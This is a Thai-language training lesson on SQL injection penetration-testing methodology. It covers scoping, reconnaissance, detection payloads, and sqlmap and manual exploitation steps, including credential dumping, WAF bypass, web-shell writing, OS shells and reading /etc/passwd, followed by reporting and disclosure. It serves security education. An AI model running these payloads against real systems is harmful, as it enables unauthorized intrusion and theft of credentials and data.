# Part 008: SQL Injection Methodology
## ระเบียบวิธีการทดสอบ SQL Injection อย่างเป็นระบบ

**ระดับ:** ⭐⭐⭐ Intermediate  
**เวลาที่ใช้เรียน:** 4-5 ชั่วโมง  
**Prerequisites:** Part 001-007

---

## 🎯 วัตถุประสงค์การเรียนรู้

เมื่อเรียนจบบทนี้ ผู้เรียนจะสามารถ:
1. วางแผนการทดสอบ SQL Injection อย่างเป็นระบบ
2. ทำ Reconnaissance เพื่อเก็บข้อมูล Target
3. ตรวจจับ SQL Injection ได้อย่างมีประสิทธิภาพ
4. ทำ Exploitation อย่างระมัดระวัง
5. เขียน Penetration Testing Report

---

## 1. ภาพรวม Methodology

```
SQL Injection Penetration Testing Methodology

Phase 1: Planning & Reconnaissance
├── กำหนด Scope
├── รวบรวมข้อมูล Target
├── Mapping Application
└── Technology Fingerprinting

Phase 2: Detection
├── Input Enumeration
├── Injection Testing
├── Error Analysis
└── Vulnerability Confirmation

Phase 3: Exploitation
├── เลือก Technique
├── Data Extraction
├── Privilege Escalation (ถ้าต้องการ)
└── Evidence Collection

Phase 4: Post-Exploitation
├── Assess Impact
├── Document Findings
└── Clean Up

Phase 5: Reporting
├── Executive Summary
├── Technical Findings
├── Remediation Recommendations
└── Evidence Appendix
```

---

## 2. Phase 1: Planning & Reconnaissance

### 2.1 กำหนด Scope (Scoping)

ก่อนเริ่มทดสอบ ต้องกำหนด Scope ให้ชัดเจน:

```
Scope Document ควรระบุ:

✅ URLs/Domains ที่ได้รับอนุญาต:
   - https://target.example.com
   - https://api.target.example.com
   - ไม่รวม: https://partner.example.com

✅ Features ที่ทดสอบได้:
   - Login Form
   - Search Function
   - Product Listing
   - User Profile

❌ สิ่งที่ห้ามทำ:
   - Denial of Service
   - Modifying Live Data
   - Social Engineering
   - Physical Access

✅ เวลาที่ทดสอบได้:
   - วันจันทร์-ศุกร์ 09:00-17:00
   - ไม่ทดสอบในช่วง Business Hours สำคัญ
```

### 2.2 Passive Reconnaissance

```bash
# WHOIS Lookup
whois target.example.com

# DNS Information
nslookup target.example.com
dig target.example.com ANY

# Subdomain Enumeration
curl "https://crt.sh/?q=%.target.example.com&output=json" | python3 -m json.tool

# Google Dorks
site:target.example.com filetype:php
site:target.example.com inurl:id=
site:target.example.com "error" "SQL"

# Technology Identification
whatweb target.example.com
```

### 2.3 Active Reconnaissance

```bash
# Port Scanning
nmap -sV -sC -p 80,443,8080,8443 target.example.com

# Web Server Information
curl -I https://target.example.com

# Directory Bruteforce
gobuster dir -u https://target.example.com -w /usr/share/wordlists/dirb/common.txt

# Parameter Discovery
arjun -u "https://target.example.com/search" -m GET
```

---

## 3. Phase 2: Detection

### 3.1 Basic Injection Testing

**Character Testing:**
```
1. ' (single quote)
2. " (double quote)
3. ` (backtick - MySQL)
4. ) (close parenthesis)
5. -- (comment)
6. # (MySQL comment)
7. /* */ (block comment)
8. ; (semicolon)
```

**Boolean Testing:**
```sql
-- สำหรับ String Parameter
[original]' AND '1'='1  -- should be same as original
[original]' AND '1'='2  -- should be different

-- สำหรับ Numeric Parameter
[original] AND 1=1       -- should be same as original
[original] AND 1=2       -- should be different
```

### 3.2 Systematic Testing Checklist

```
□ ทดสอบ Single Quote ทุก Parameter
□ ทดสอบ Boolean True/False
□ ทดสอบ Time Delay
□ วิเคราะห์ Error Messages
□ ยืนยัน SQLi สำเร็จ
□ ทดสอบ Encoded Versions (%27 แทน ')
```

---

## 4. Phase 3: Exploitation

### 4.1 SQLMap - Automated Exploitation

```bash
# Basic Usage - GET Parameter
sqlmap -u "http://target.com/product?id=1" --dbs

# POST Parameter
sqlmap -u "http://target.com/login" \
  --data "username=admin&password=test" \
  --dbs

# Cookie Parameter
sqlmap -u "http://target.com/dashboard" \
  --cookie "user_id=5" \
  --dbs

# HTTP Header
sqlmap -u "http://target.com/" \
  -H "User-Agent: *" \
  --dbs

# JSON Body
sqlmap -u "http://target.com/api/search" \
  --data '{"q": "*"}' \
  --content-type "application/json" \
  --dbs

# ขั้นตอนทั้งหมด
sqlmap -u "http://target.com/product?id=1" \
  --dbs \              # ดู Databases
  -D myapp \           # เลือก Database
  --tables \           # ดู Tables
  -T users \           # เลือก Table
  --columns \          # ดู Columns
  -C username,password \ # เลือก Columns
  --dump               # ดึงข้อมูล
```

### 4.2 SQLMap Advanced Options

```bash
# Bypass WAF ด้วย Tamper Scripts
sqlmap -u "..." --tamper=space2comment
sqlmap -u "..." --tamper=between,randomcase,space2comment

# เพิ่ม Risk และ Level
sqlmap -u "..." --level=5 --risk=3

# File Operations (ต้องมีสิทธิ์)
sqlmap -u "..." --file-read=/etc/passwd
sqlmap -u "..." --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php

# OS Command Execution
sqlmap -u "..." --os-cmd="whoami"
sqlmap -u "..." --os-shell  # Interactive Shell
```

### 4.3 Manual Data Extraction Flow

```sql
-- STEP 1: Identify Database Type
MySQL: SELECT @@version;
MSSQL: SELECT @@VERSION;
PostgreSQL: SELECT version();
Oracle: SELECT * FROM v$version WHERE banner LIKE 'Oracle%'

-- STEP 2: Get System Information
SELECT @@version, database(), user(), @@hostname;
SELECT @@secure_file_priv;

-- STEP 3: Enumerate Databases
SELECT group_concat(schema_name SEPARATOR ', ') 
FROM information_schema.schemata;

-- STEP 4: Enumerate Tables
SELECT group_concat(table_name) 
FROM information_schema.tables 
WHERE table_schema='target_db';

-- STEP 5: Extract Sensitive Data
SELECT group_concat(username, ':', password SEPARATOR '\n')
FROM users;

-- STEP 6: Check for File/OS Access
SELECT LOAD_FILE('/etc/passwd');
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
EXEC xp_cmdshell 'whoami';
```

---

## 5. Phase 5: Reporting

### 5.1 Executive Summary Template

```markdown
# Penetration Testing Report
## Executive Summary

**Client:** Example Corporation
**Test Period:** 1-7 January 2024
**Classification:** Confidential

### Risk Summary
| Severity  | Count |
|-----------|-------|
| Critical  | 1     |
| High      | 2     |
| Medium    | 3     |
| Low       | 5     |

### Top Findings
1. **SQL Injection in Search Function** (Critical) - พบที่ /search?q=
2. **Weak Password Policy** (High)
3. **Missing Security Headers** (Medium)
```

### 5.2 Finding Documentation Template

```markdown
### Finding ID: SQLi-001
**Title:** SQL Injection in Product Search Parameter
**Severity:** Critical (CVSS 9.8)

**Evidence:**
1. Test Payload: `' AND '1'='1` vs `' AND '1'='2`
2. Data Extraction: `' UNION SELECT 1,group_concat(username,':',password) FROM users--`

**Remediation:**
```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE name LIKE ?");
$stmt->execute(["%$search%"]);
```
```

---

## 6. Responsible Disclosure Process

```
1. พบช่องโหว่ใน Bug Bounty Program หรือ Authorized Test
2. บันทึก Evidence อย่างครบถ้วน
3. เขียน Report ที่ชัดเจนและละเอียด
4. ส่ง Report ไปยัง Security Team
5. รอ 90 วัน (CVD Standard)
6. เปิดเผยต่อสาธารณะ (หลัง Fix)
```

---

## 🔑 สรุป

```
1. Methodology ที่เป็นระบบช่วยให้ทดสอบได้ครอบคลุมและเป็นมาตรฐาน
2. Written Authorization เป็นสิ่งที่ขาดไม่ได้
3. Clean Up หลังทดสอบเป็นความรับผิดชอบ
4. Responsible Disclosure เป็นสิ่งสำคัญ
```

---

*Part 008 | SQL Injection Mastery Course | Security Education Only*